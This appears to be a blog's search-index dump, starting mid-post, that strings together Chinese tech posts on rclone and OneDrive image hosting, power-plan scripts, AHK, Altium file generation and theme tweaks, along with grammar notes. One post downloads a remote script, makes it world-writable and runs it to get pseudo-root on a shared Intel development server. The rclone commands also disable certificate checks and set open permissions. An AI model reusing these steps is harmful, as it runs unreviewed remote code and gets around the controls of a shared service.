rclone需要持久化运行，我这里建议的是Supervisor或系统自带的systemd，windows使用nssm 1rclone mount one:/share/mount/ /www/wwwroot/pic.hzchu.top/storage/app/mount/ --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000 --vfs-cache-mode full --attr-timeout 15m --vfs-cache-max-age 240h --vfs-cache-max-size 1G --buffer-size 100M supervisorsystemd以宝塔面板为例 打开软件商店，搜索并安装进程守护管理器： 点击添加守护进程，如图所示 运行： 1sudo vim /etc/systemd/system/rclone-one.service ​\t写入： 1234567891011121314[Unit]Description=rclone-oneAfter=network.target remote-fs.target nss-lookup.target[Service]User=rootExecStart=rclone mount one:/share/mount/ /www/wwwroot/pic.hzchu.top/storage/app/mount/ --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000 --vfs-cache-mode full --attr-timeout 15m --vfs-cache-max-age 240h --vfs-cache-max-size 1G --buffer-size 100MExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDRestart=on-abnormalRestartSec=5s[Install]WantedBy=multi-user.target 安装（主服务器） 可以用无服务器函数，这里使用onedrive-vercel-index作为OneDrive的直链解析，这里是它的文档 将baseDirectory设为/share 1690813605718.webp 由于原作者的应用程序已过期，需要自行配置，参考高级 - OneDrive Vercel Index (swo.moe)进行调整 由于vercel.app在国内污染严重，请绑定你的域名 中途 开香槟 测试 在图床中上传一张图片，查看是否上传成功，若出现错误，则检查图床服务器 等待5分钟后访问https://yourdomain.top/zh-CN/mount/，查看是否出现pic文件夹，并根据年/月/日进入子文件夹查看能否访问图片 1690813930882.webp image-20230731223247351 安装（副服务器） 需要安装redis，故不推荐使用虚拟主机，但非要用可以使用Vercel的Durable Redis 注： jumpurl为该节点的对外访问地址 apiurl 为“副服务器”的对外访问地址 backupurl 为“图床服务器“的对外访问地址 mainurl 为“主服务器“的对外访问地址 PHP版本Python版本解析 需要修改redis连接地址，$user_token和$mainurl Code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;?php// 连接 Redis 服务器$redis = new Redis();$redis-&gt;connect(&#x27;127.0.0.1&#x27;, 6379);$redis-&gt;select(2);//token$user_token = &quot;yourtoken&quot;;//主服务器url$mainurl = &quot;https://yourdomain.top/api/raw/?path=/&quot;;// 定义限制器类class Limiter &#123; private $limits; private $key_func; private $requests; public function __construct($key_func, $default_limits) &#123; $this-&gt;limits = $default_limits; $this-&gt;key_func = $key_func; $this-&gt;requests = array(); &#125; public function limit($route, $limit) &#123; if (!isset($this-&gt;requests[$route])) &#123; $this-&gt;requests[$route] = array(); &#125; $key = call_user_func($this-&gt;key_func); if (!isset($this-&gt;requests[$route][$key])) &#123; $this-&gt;requests[$route][$key] = array(); &#125; array_push($this-&gt;requests[$route][$key], time()); while (count($this-&gt;requests[$route][$key]) &gt; 0 &amp;&amp; time() - $this-&gt;requests[$route][$key][0] &gt; 1) &#123; array_shift($this-&gt;requests[$route][$key]); &#125; if (count($this-&gt;requests[$route][$key]) &gt; $limit) &#123; http_response_code(429); die(&#x27;Too Many Requests&#x27;); &#125; &#125;&#125;// 定义获取客户端 IP 地址的函数function get_remote_address() &#123; return $_SERVER[&#x27;REMOTE_ADDR&#x27;];&#125;// 初始化限制器$limiter = new Limiter(&#x27;get_remote_address&#x27;, array(&#x27;40 per second&#x27;));// 定义 update 路由if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; $_SERVER[&#x27;REQUEST_URI&#x27;] === &#x27;/_api/update&#x27;) &#123; // 检查请求速率 $limiter-&gt;limit(&#x27;/_api/update&#x27;, 5); // 获取请求参数 $json = json_decode(file_get_contents(&#x27;php://input&#x27;), true); $token = isset($json[&#x27;token&#x27;]) ? $json[&#x27;token&#x27;] : null; $server_id = isset($json[&#x27;server_id&#x27;]) ? $json[&#x27;server_id&#x27;] : null; $url = isset($json[&#x27;url&#x27;]) ? $json[&#x27;url&#x27;] : null; // 检查参数完整性 if (!$token || !$server_id || !$url) &#123; http_response_code(400); die(json_encode(array(&#x27;code&#x27; =&gt; 1002, &#x27;msg&#x27; =&gt; &#x27;Missing required parameters.&#x27;))); &#125; // 检查 token 是否有效 if ($token !== $user_token) &#123; http_response_code(400); die(json_encode(array(&#x27;code&#x27; =&gt; 1002, &#x27;msg&#x27; =&gt; &#x27;Invalid token.&#x27;))); &#125; // 更新服务器信息 $redis-&gt;setEx(&quot;jump_$server_id&quot;, 1200, $url); // 返回成功消息 header(&#x27;Content-Type: application/json&#x27;); echo json_encode(array(&#x27;code&#x27; =&gt; 0, &#x27;msg&#x27; =&gt; &#x27;ok&#x27;));&#125;// 定义 jump 路由else if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27; &amp;&amp; preg_match(&#x27;/^\\/(.+)$/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;], $matches)) &#123; // 检查请求速率 $limiter-&gt;limit(&#x27;/&lt;path:url&gt;&#x27;, 40); // 获取客户端请求的 URL $url = $matches[1]; // 从 Redis 中读取数据 for ($i = 1; $i &lt;= 5; ++$i) &#123; if ($redis-&gt;exists(&quot;jump_$i&quot;)) &#123; $orig_url = $redis-&gt;get(&quot;jump_$i&quot;); break; &#125; &#125; // 如果未找到数据，则使用默认的原始 URL if (!isset($orig_url)) &#123; $orig_url = $mainurl; &#125; // 拼接 URL 并重定向客户端 header(&#x27;Location: &#x27; . ($orig_url . urlencode($url)));&#125; 伪静态配置: 123location / &#123; try_files $uri $uri/ /index.php?$args;&#125;Code: 需要修改redis连接地址，user_token 和 mainurl 安装依赖： 1pip3 install flask flask_limiter hypercorn flask_cors 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from flask import Flask, jsonify, request, redirectfrom flask_limiter import Limiterfrom flask_limiter.util import get_remote_addressimport redisfrom hypercorn.asyncio import servefrom hypercorn.config import Configimport asynciolimiter = Limiter( key_func=get_remote_address, default_limits=[&quot;20 per second&quot;], storage_uri=&#x27;redis://localhost:6379&#x27;)config = Config()#配置区redis_client = redis.Redis(host=&#x27;localhost&#x27;, port=6379, db=2)mainurl = &quot;https://yourdomain.top/api/raw/?path=/&quot;user_token = &quot;user_token&quot; #双端保持一致config.bind = [&quot;0.0.0.0:56789&quot;] #可自行修改端口号config.protocol = &quot;h2&quot; # 启用HTTP2#注意需要替换为你的证书路径config.certfile = &quot;./pem.pem&quot;config.keyfile = &quot;./key.key&quot;#访问日志config.accesslog = &quot;access.log&quot;app = Flask(__name__)limiter.init_app(app)@app.route(&#x27;/_api/update&#x27;, methods=[&#x27;POST&#x27;])@limiter.limit(&quot;5 per second&quot;)def update(): token = request.json.get(&#x27;token&#x27;) server_id = request.json.get(&#x27;server_id&#x27;) url = request.json.get(&#x27;url&#x27;) if not token or not url or not server_id: return jsonify(&#123;&#x27;code&#x27;:1002,&#x27;msg&#x27;: &#x27;Missing required parameters.&#x27;&#125;), 400 if token != user_token: return jsonify(&#123;&#x27;code&#x27;:1002,&#x27;msg&#x27;: &#x27;Invalid token.&#x27;&#125;), 400 print(server_id) key = f&#x27;jump_&#123;server_id&#125;&#x27; redis_client.setex(key, 1200, url) return jsonify(&#123;&#x27;code&#x27;:0,&#x27;msg&#x27;: &#x27;ok&#x27;&#125;), 200@app.route(&#x27;/&lt;path:url&gt;&#x27;)@limiter.limit(&quot;30 per second&quot;)def jump(url): for i in range(1, 6): # 从Redis中读取数据 orig_url = None value = redis_client.get(f&#x27;jump_&#123;i&#125;&#x27;) if value: orig_url = value.decode(&#x27;utf-8&#x27;) break if not orig_url: orig_url = mainurl backurl = orig_url + url return redirect(backurl)if __name__ == &#x27;__main__&#x27;: #app.run(debug=True) #app.run() asyncio.run(serve(app, config))运行逻辑： image-20230802152803639 flowchart TD id0([访问]) --> id1[\"判断路径是否为'/_api/update'\"] id1 --> |是| id2[\"读取相关数据计入redis\"] id1 --> |否| id3[\"设初始值为n(n₀=1,","tags":["MNSLXOD"]},{"title":"Windows下的电源计划自动控制","path":"/2023/auto-control-power-plan/","content":"代码部分 之前搞了一套E5扔在角落里吃灰，这几天想起来准备当nas用。不过在最高频率下运行功率实在恐怖（140w+），在Windows下限制CPU频率最简单的就是电源计划了，话不多说 123456789101112131415161718192021222324252627282930313233import subprocessimport psutilimport timeBALANCE=&#x27;381b4222-f694-41f0-9685-ff5bb260df2e&#x27;HIGH_PERFORMANCE=&#x27;8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c&#x27;ENERGY_SAVER=&#x27;a1841308-3541-4fab-bc81-f71556f20b4a&#x27;def change_power_plan(plan): subprocess.run(f&#x27;powercfg /S &#123;plan&#125;&#x27;) def get_power_plan(): output = subprocess.run(&quot;powercfg /GETACTIVESCHEME&quot;, shell=True, stdout=subprocess.PIPE).stdout.decode(&quot;GBK&quot;) return output.split(&quot; &quot;)[-3]while True: cpu_percent = psutil.cpu_percent(interval=1) current_time = time.localtime().tm_hour plan = get_power_plan() #print(plan) if current_time &gt;= 23 or current_time &lt;= 6: if plan != ENERGY_SAVER: print(current_time+&quot;：切换到节能模式&quot;) change_power_plan(ENERGY_SAVER) elif cpu_percent &gt; 90: if plan != HIGH_PERFORMANCE: print(current_time+&quot;：切换到高性能模式&quot;) change_power_plan(HIGH_PERFORMANCE) else: if plan != BALANCE: print(current_time+&quot;：切换到平衡模式&quot;) change_power_plan(BALANCE) time.sleep(60) 其中，这一部分需要自己获取 123BALANCE=&#x27;381b4222-f694-41f0-9685-ff5bb260df2e&#x27;HIGH_PERFORMANCE=&#x27;8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c&#x27;ENERGY_SAVER=&#x27;a1841308-3541-4fab-bc81-f71556f20b4a&#x27; 使用powercfg /GETACTIVESCHEME获取电源计划GUID并填入 image-20230117191532293 当时间晚于11点或早于6点时，设置为节能 当CPU占用大于90时，调为高性能 其余时间为平衡 效果 为了演示，这里将时间间隔调整为1s 1113.gif 有负载时 1114.gif PS：电源计划中限制频率的方法 1673955297733.webp","tags":["Windows"]},{"title":"定语从句要点复习（笔记）","path":"/2022/definite-clause-point-review/","content":"要点一：判断 1.位于名词或者代词之后： 2.可翻译为“…的”； 3.前后句有重叠部分 要点二：关系代词和关系副词的选择 关系代词：that/which/who/whom/whose/as 关系副词：when/where/why （=介词+which） 1.成分分析法： ​\t定语从句缺主语或宾语，用关系代词： ​\t定语从句完整，不缺主宾，用关系副词。 代入法： ​\t将先行词代入到定语从句中，若刚好完整用关系代词； ​\t若需要补充介词才完整，则用关系副词; 有关习题 0d3ac79c-d33e-45b6-a1d8-4a3a4756b270.webp dfc44830-58e2-4fd5-b0db-4e31a063f594.webp 要点三：that v.s which 在指物的情况下（毕竟which不能指人），that和which一般是可以互换的，但是以下情况不能互换。 用that不用which的四种情况： ​\t1.先行词为指物的不定代词或被不定代词修饰： ​ ​\t2.先行词被最高级或者序数词修饰； ​ ​\t3.先行词被the very，the only或者just the修饰： ​ ​\t4.先行词中既有人又有物。 用which不用that的三种情况： ​\t1.非限制性定语从句（有逗号）； ​ ​\t2.以整个句子作为先行词（非限制性定从）； ​ ​\t3.介词后的关系代词。 多写that 要点四：who v.s that 在指人的情况下，who和that一般是可以互换的，但是如果先行词是某些代词，比如he,anyone,those等，这时的关系代词应该用who，不用that。 eg: 谁能笑到最后,才是笑得最好: He who laughs last laughs best. 要点五：介词后关系代词的选择 介词+（指物）which 介词+（指人）whom 介词后不是加which，就是加whom 要点六： whose + n.* （指物）whose+n.=of which + the + n.=the + n. + of which （指人）whose+n.=of whom + the + n.=the + n. + of whom of 可表所属关系，抽象点理解可以得到第二种 whose father = the father of whom 若挖空 ------- the n.则不考虑whose 要点七：as引导的定语从句 **as是关系代词** 限制性定语从句： 当先行词被such/so/as/the same等修饰（结构类） 非限制性定语从句： as以整个句子作为先行词，翻译为“**正如**” as is known（众所周知）, / as is said（据说）,/ as is reported（据报道）,as is announced（据宣布）,/as is expected（据期待）,/as we know（正如我们知道的那样）, as we expect（正如我们期待的那样）,/as often happens（正如经常发生的那样）,/as is often the case（正如通常情况下）,… 要点八：the way 作为先行词的定语从句* I don’t like the way that/in which/省略 you speak to your Mom. 通常为that 要点九：定语从句的主谓一致问题 1.定语从句的谓语动词的单复数取决于先行词； 2.当先行词被one of修饰，定从谓语用复数； 当先行词被the only one of修饰，定从谓语用单数； 3.as和which以整个句子作为先行词，定从谓语用单数； 理解 要点十：特殊名词作为先行词的定语从句 situation/case/scene/spot/point（地步）/stage —关系副词用where occasion（时机）—关系副词用when","tags":["笔记"]},{"title":"更便利地操控表彰大会--AHK","path":"/2022/Easier-Control-of-Recognition-Conferences-AHK/","content":"前言 前几个月考完月考，第1次月考的时候因为主持人不懂按ppt.经过我舍友一番吹水，给我拉了上去，虽然威风，但我只负责按下一页和播放颁奖曲。 然鹅，放歌的重任着实有点难为我手上的翻页笔，导致我只能反反复复地从后台门旁跑到电脑旁，毕竟不能挡着队伍的道（谢天谢地，那台笔记本的键盘还有多媒体键） img 那么，在尴尬了3个小时后，为了应对期中后表彰大会同样的情况，还是要想个对策 思考 翻页笔，说白了就是个小键盘（宏），上下翻页自然是上下键，“黑屏”即为B键，再高级的就不是单纯的键盘了。当然，我手上这支来自于我勤俭持家的英语老师，只有下图这几个键 img 图片在某宝找了个同款 环顾一圈，只有Enter键是用不上的，那不就可以搞一波按键映射，让它成为播放/暂停键 实践 按键映射还得是老大哥*——*Autohotkey(AHK) 根据AHK的语法，下面的“句子”便可以实现，复制写入一个文档里并改后缀名为.ahk，导入即可 1Enter::Media_Play_Pause 我这里为了方便将其导出为一个独立程序 img 事实证明，效果不错，让我还能在里面摸鱼","tags":["AHK"]},{"title":"使用Python半自动生成Altium原理图封装","path":"/2022/ptyhon-with-altium-designer/","content":"前言 放长假了，想搞点钱，对我而言来钱最快的就是帮别人画原理图PCB图了。 不过画了几天发现一个问题：一直以来都自己画自己的，而现在帮别人画，客户发的很多原理图的封装都没有，基本上每画一个图都要画两三个，碰到一些小的还好几分钟就能画完，碰到一些大点的芯片引脚多的很的，自己画一个（配上电脑拉跨debuff）还要十几分钟，在立创EDA上面找的又经常有错，很是不爽 不过得益于AD高版本可以以成文本形式保存原理图文件，使用程序完成任务也就成为了可能。 历程 随便新建一个原理图以ASCII保存。打开来可以看见这么一份”模板“， 模板123456789101112131415161718192021222324252627282930|HEADER=Protel for Windows - Schematic Capture Ascii File Version 5.0|WEIGHT=38|ISBOC=T|RECORD=31|VISIBLEGRIDON=T|VISIBLEGRIDSIZE=10|DISPLAY_UNIT=4|CUSTOMY=950|BORDERON=T|HOTSPOTGRIDON=T|CUSTOMX=1500|CUSTOMMARGINWIDTH=20|SIZE1=10|SHEETNUMBERSPACESIZE=4|CUSTOMYZONES=4|USEMBCS=T|FONTIDCOUNT=1|SNAPGRIDSIZE=10|SHEETSTYLE=5|SYSTEMFONT=1|HOTSPOTGRIDSIZE=4|FONTNAME1=Times New Roman|TITLEBLOCKON=T|AREACOLOR=16317695|SNAPGRIDON=T|CUSTOMXZONES=6|RECORD=41|ISHIDDEN=T|NAME=CurrentTime|OWNERPARTID=-1|COLOR=8388608|TEXT=*|READONLYSTATE=1|UNIQUEID=WFYPTBEC|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=CurrentDate|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=1|COLOR=8388608|READONLYSTATE=1|UNIQUEID=KRGPTHWR|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Time|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=2|COLOR=8388608|READONLYSTATE=1|UNIQUEID=APNVELVY|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Date|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=3|COLOR=8388608|READONLYSTATE=1|UNIQUEID=DOFGRYNH|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=DocumentFullPathAndName|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=4|COLOR=8388608|READONLYSTATE=1|UNIQUEID=XTILODYM|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=DocumentName|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=5|COLOR=8388608|READONLYSTATE=1|UNIQUEID=CIXOCUKW|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=ModifiedDate|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=6|COLOR=8388608|READONLYSTATE=1|UNIQUEID=CYVLOLHC|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=ApprovedBy|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=7|COLOR=8388608|READONLYSTATE=1|UNIQUEID=UKLMMPSH|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=CheckedBy|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=8|COLOR=8388608|READONLYSTATE=1|UNIQUEID=LGBVFHBI|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Author|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=9|COLOR=8388608|READONLYSTATE=1|UNIQUEID=NNMPOPVS|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=CompanyName|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=10|COLOR=8388608|READONLYSTATE=1|UNIQUEID=ROXAGALI|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=DrawnBy|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=11|COLOR=8388608|READONLYSTATE=1|UNIQUEID=GSEQEJEE|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Engineer|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=12|COLOR=8388608|READONLYSTATE=1|UNIQUEID=NMEAIFPG|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Organization|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=13|COLOR=8388608|READONLYSTATE=1|UNIQUEID=CHTRTWQS|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Address1|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=14|COLOR=8388608|READONLYSTATE=1|UNIQUEID=SLYDDXDR|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Address2|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=15|COLOR=8388608|READONLYSTATE=1|UNIQUEID=JNHWHKQI|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Address3|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=16|COLOR=8388608|READONLYSTATE=1|UNIQUEID=MIQKOJUC|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Address4|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=17|COLOR=8388608|READONLYSTATE=1|UNIQUEID=TBHPRINX|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Title|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=18|COLOR=8388608|READONLYSTATE=1|UNIQUEID=JRIVAVFH|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=DocumentNumber|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=19|COLOR=8388608|READONLYSTATE=1|UNIQUEID=SJJFVEJY|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Revision|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=20|COLOR=8388608|READONLYSTATE=1|UNIQUEID=TPPALWNV|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=SheetNumber|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=21|COLOR=8388608|READONLYSTATE=1|UNIQUEID=IXCDWQOY|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=SheetTotal|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=22|COLOR=8388608|READONLYSTATE=1|UNIQUEID=WLJMRBEM|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=Rule|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=23|COLOR=8388608|READONLYSTATE=1|UNIQUEID=SGMPJKTU|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=ImagePath|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=24|COLOR=8388608|READONLYSTATE=1|UNIQUEID=CDHEMVMP|FONTID=1|RECORD=41|ISHIDDEN=T|NAME=ProjectName|TEXT=*|OWNERPARTID=-1|INDEXINSHEET=25|COLOR=8388608|READONLYSTATE=1|UNIQUEID=FMWVHCEF|FONTID=1|HEADER=Icon storage|HEADER=Protel for Windows - Schematic Capture Ascii File Version 5.0 文本是OLE复合文档,有开发需要可以在这个仓库里查看。 Altium schematic file formathttps://github.com/vadmium/python-altium/blob/master/format.md 测试放置一个3PIN可以看到多了这么一部分 1234567891011|RECORD=1|PARTIDLOCKED=T|COLOR=128|SOURCELIBRARYNAME=Miscellaneous Devices.SchLib|OWNERPARTID=-1|DISPLAYMODECOUNT=1|INDEXINSHEET=26|DESIGNITEMID=3PIN|PARTCOUNT=2|LIBREFERENCE=3PIN|LIBRARYPATH=*|LOCATION.X=440|AREACOLOR=11599871|TARGETFILENAME=*|CURRENTPARTID=1|LOCATION.Y=450|UNIQUEID=JDTBOSLP|RECORD=14|ISNOTACCESIBLE=T|LOCATION.X=440|CORNER.Y=450|ISSOLID=T|OWNERPARTID=1|OWNERINDEX=27|CORNER.X=470|COLOR=128|AREACOLOR=11599871|LOCATION.Y=410|DESIGNATOR=1|RECORD=2|NAME=1|LOCATION.X=440|PINLENGTH=20|OWNERPARTID=1|PINCONGLOMERATE=42|ELECTRICAL=4|OWNERINDEX=27|FORMALTYPE=1|LOCATION.Y=440|SWAPIDPIN=1|ISHIDDEN=T|RECORD=41|LOCATION.X=440|NAME=PinUniqueId|OWNERPARTID=-1|OWNERINDEX=29|TEXT=BNSVPWEQ|COLOR=8388608|LOCATION.Y=440|FONTID=1|DESIGNATOR=2|RECORD=2|NAME=2|LOCATION.X=440|PINLENGTH=20|OWNERPARTID=1|PINCONGLOMERATE=42|ELECTRICAL=4|OWNERINDEX=27|FORMALTYPE=1|LOCATION.Y=430|SWAPIDPIN=2|ISHIDDEN=T|RECORD=41|LOCATION.X=440|NAME=PinUniqueId|OWNERPARTID=-1|OWNERINDEX=30|TEXT=DQCSMDTO|COLOR=8388608|LOCATION.Y=430|FONTID=1|DESIGNATOR=3|RECORD=2|NAME=3|LOCATION.X=440|PINLENGTH=20|OWNERPARTID=1|PINCONGLOMERATE=42|ELECTRICAL=4|OWNERINDEX=27|FORMALTYPE=1|LOCATION.Y=420|SWAPIDPIN=3|ISHIDDEN=T|RECORD=41|LOCATION.X=440|NAME=PinUniqueId|OWNERPARTID=-1|OWNERINDEX=31|TEXT=TFWBGGDS|COLOR=8388608|LOCATION.Y=420|FONTID=1|RECORD=34|LOCATION.X=440|NAME=Designator|TEXT=P?|OWNERINDEX=27|OWNERPARTID=-1|COLOR=8388408|INDEXINSHEET=-1|READONLYSTATE=1|LOCATION.Y=450|FONTID=1|RECORD=41|LOCATION.X=440|NAME=Comment|TEXT=3PIN|OWNERINDEX=27|OWNERPARTID=-1|COLOR=8388608|INDEXINSHEET=-1|UNIQUEID=SIFBYFRD|LOCATION.Y=400|FONTID=1|OWNERINDEX=27|RECORD=44 可以看出 12345678RECORD = 1：器件开始2: 引脚14：长方形（背景）34：元件标号41：脚注44：器件结束DESIGNATOR：管脚标号 还有像xy坐标，NAME，COLOR等不必多说 接着就是写个python脚本把它们拼起来辣 addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-9jispk58d' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-9jispk58d'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Faltium-helper%2Fmaster%2Fpackager.py&lang=python&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-9jispk58d'); }); }); }); }); 再生成原理图库复制到自己的库就行了 小说明 放置类型 И 凵(常用) Z 执行效果 值得注意的点 1. 在“模板”的头部中，WEIGHT代表着剩余的部件量，如果设置的太小当AD读取完后就不会往下读了，就会导致缺这缺那 1|HEADER=Protel for Windows - Schematic Capture Ascii File Version 5.0|WEIGHT=38 2.同样在“模板”的头部中，第二行中包括了纸张大小等的定义，如果遇到🐞可以适当修改 3.引脚方向依据PINCONGLOMERATE的值，连接方向向右时为56，从此每逆时针旋转90°加一 4.xy坐标必须为不带小数的整数，不然它立马扑街给你看","tags":["python"]},{"title":"2021旧年总结","path":"/2022/2021旧年总结/","content":"2021 has ended but 2022 begins 新年伊始，又是新的一年。做个年终总结吧。证明我还活着 先看看曾经定的Todo list [x] 进到实验班。 [x] 设立导航 [ ] 被百度收录。看淡了，我把站点地图怼它脸上，写个脚本每4分钟提交一次，还没收录，百度是神马东西 [x] 写个基于cfw的工具。写了不少 [x] Golang入门。大概吧 过去的一年，好像时间变快了不少，不知不觉就过去了。6月份往前都在备考生地，放个暑假回来后又是各种考试，两周一休算了算回家的次数好像还不到10次 学会了很多，也见证了不少（省略数千字） 定个目标 [ ] 考上一中! （和学校有约~ [x] 最好再进实验班 附 因为没啥时间，也没有写到什么实质上的内容，不过也有2200+的小伙伴来访~ 祝各位虎年大吉，虎虎生威","tags":["yearreport"]},{"title":"把玩intel的开发服务器","path":"/2021/把玩intel的开发服务器/","content":"获取 打开Intel® DevCloud，有账号登录，没账号注册， 拉下来找到Intel® DevCloud for the Edge点进去 注意邮箱 在看到Server not running这个话前基本都500错误或者点了没反应，等半个小时就好(也可以切换网络环境等) 打开终端 然后就可以为所欲为了没有root的啦 配置 80核，256g( ‵▽′)ψ，（共用） proot容器内测试 网速 Asia Another 伪获取root权限 在终端内复制粘贴以下命令 123wget https://share.hzchu.top/%E8%BD%AF%E4%BB%B6/root.shchmod 777 root.sh./root.sh 当$变为#就ok 不过wget,curl这些都没有，所以还要自行安装 PS:可以开新一个终端下载一些必要依赖包（deb）再离线安装 https://packages.debian.org 该服务器使用时间只有10小时，但10小时后还可以再来一次","tags":["Intel"]},{"title":"解决Cloudflare Wrangler无法获取授权","path":"/2021/解决Cloudflare-Wrangler无法获取授权/","content":"前言 昨天，因为要本地提交点东西到worker就装了Wrangler，没想到啊，它就这么卡着不动了（在waiting for api token那里我等了半个世纪） 方法 在刚刚的授权页面点击API令牌 点投放–copy 输入wrangler config,粘贴刚刚copy的token 回车后看到sucess就好了 后 写的时侯为了截图换了个账号，然后它能用了~~~~","tags":["Cloudflare"]},{"title":"解决VSCode安装Go扩展报错","path":"/2021/解决VSCode安装Go扩展报错/","content":"不多哔哔，直入主题 先转到新建环境变量这里（图示为win11 新建2个（如图） 变量名 变量值 GOPROXY https://goproxy.io GO111MODULE on 点确定后重启再进VSCode里选择install all安装就好","tags":["Go"]},{"title":"为Stellar主题添加HPP的\"说说\"功能","path":"/2021/为Stellar主题添加HPP说说功能/","content":"HPP,即HexoPlusPlus,其中自带了&quot;说说&quot;功能，但我正在用的Stellar不支持，那就自己加吧 与某个页面合并了 选址 纵观全局，我看到了左侧栏的&quot;文章&quot;，加了进去，却成了这个鸟样子（橙框为我手动框出来的） 再品，放这里不就好了😎 开工 因为主题在不同语言时有不同显示，所以先从语言文件下手 找到&quot;归档&quot;对应的是archives，再用everything在主题文件中搜索 前4个是语言文件，第5个是生成归档页面的，那第6个就有很大嫌疑了，打开看看 啊没错，就是它，而且类名也对的上（当初直接查类名更快啊＞﹏＜） 格式就像这样 1234567&lt;% if (site.posts &amp;&amp; site.posts.length &gt; 0) &#123; %&gt; &lt;% if (is_archive()) &#123; %&gt; &lt;a class=&#x27;active&#x27; href=&#x27;&lt;%- url_for(config.archive_dir) %&gt;&#x27;&gt;&lt;%- __(&#x27;btn.archives&#x27;) %&gt;&lt;/a&gt; &lt;% &#125; else &#123; %&gt; &lt;a href=&#x27;&lt;%- url_for(config.archive_dir) %&gt;&#x27;&gt;&lt;%- __(&#x27;btn.archives&#x27;) %&gt;&lt;/a&gt; &lt;% &#125; %&gt;&lt;% &#125; %&gt; 添加上去后把所有archives给替换成了htalk,但是一运行那报错和放鞭炮没什么不同(。﹏。) 从代码上说，这句是判断当前是什么页面的，我翻了亿下没找到它的定义在哪个文件，就先改回posts（只是影响了按钮底色，问题不大(❁´◡`❁)） 在\\themes\\stellar\\layout下新建htalk.ejs,从隔壁tag.ejs借鉴点代码过来，除了site.tags.length其他都改为htalk 可以看出第11行到21行都是页面中可以显示出来的部分~~（不太严谨的样子~~ 把HPP文档中的&quot;引入部分&quot;插到里面 ¯_(ツ)_/¯ 加个题目 1&lt;h1 class=&#x27;list-title h3&#x27;&gt;说说（瞎扯）&lt;/h1&gt; 承 接 前 文，看着&quot;说说&quot;按钮选中时没有底色还是有点不爽，回到前面 把判定部分都删了删到只剩下一个基础的判定（虽然没用但删了就报错），给它加上id=&quot;nav-bb&quot;的属性 再在htalk.ejs中加上 1&lt;script&gt;document.getElementById(&#x27;nav-bb&#x27;).className=&#x27;active&#x27;&lt;/script&gt; ( •̀ ω •́ )✧ 最终代码 !!! warning 1.记得使用hexo new page htalk并在layout中改为htalk 2.在博客根目录下的_config.yml中要指明htalk_dir: htalk","tags":["Blog"]},{"title":"优化Oneindex的nexmoe主题的加载速度","path":"/2021/优化Oneindex的nexmoe主题的加载速度/","content":"在一些带宽小的机子上部署Oneindex又用nexmoe主题，就算套了cdn也慢（深有体会） 在学校开来给同学下电影开了十几秒愣是没加载出来 方法 定位到网址目录下的/view/nexmoe 将框选的（第7行的第11行） 进行替换 第7行 1&lt;link rel=&quot;stylesheet&quot; href=&quot;//npm.elemecdn.com/mdui@1.0.1/dist/css/mdui.min.css&quot;&gt; 第11行 1&lt;script 